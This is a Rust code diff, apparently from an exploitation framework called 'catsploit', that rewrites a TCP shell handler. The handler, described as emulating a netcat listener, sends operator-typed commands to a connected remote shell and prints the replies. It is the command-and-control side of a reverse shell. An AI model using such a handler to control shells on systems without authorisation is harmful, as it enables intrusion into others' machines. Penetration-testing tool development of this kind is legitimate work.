@@ -5,7 +5,7 @@
 
 use log::info;
 use std::error::Error;
-use std::io;
+use std::io::{self, BufRead, BufReader};
 use std::{
     io::{Read, Write},
     net::{TcpListener, TcpStream},
@@ -34,18 +34,43 @@ impl GenericTcpHandler {
     }
 
     pub fn open_shell(mut stream: TcpStream) -> Result<(), Box<dyn Error>> {
+        let mut buffer = [0; 1024];
         loop {
+            // TODO: work in progress, trying to emulate nc -lvnp
+            /*
             let mut cmd = String::new();
-            print!("shell_input> ");
             io::stdin().read_line(&mut cmd)?;
             if cmd == "catsploit_handler_exit" {
                 break;
             }
+            println!("Got cmd, trying to write to stream: {}", cmd);
             stream.write(cmd.as_bytes())?;
+            println!("written to stream");
 
             let mut out = String::new();
-            stream.read_to_string(&mut out)?;
+            stream_buf.read(&mut out)?;
             print!("{}", out);
+            io::stdout().flush()?;
+            */
+            print!("> ");
+            std::io::stdout().flush().unwrap();
+            let mut input = String::new();
+            std::io::stdin().read_line(&mut input).unwrap();
+            stream.write_all(input.trim().as_bytes()).unwrap();
+
+            match stream.read(&mut buffer) {
+                Ok(n) => {
+                    if n == 0 {
+                        break;
+                    }
+                    let received = String::from_utf8_lossy(&buffer[0..n]);
+                    println!("Received: {}", received.trim());
+                }
+                Err(e) => {
+                    eprintln!("Error reading from socket: {}", e);
+                    break;
+                }
+            }
         }
         Ok(())
     }
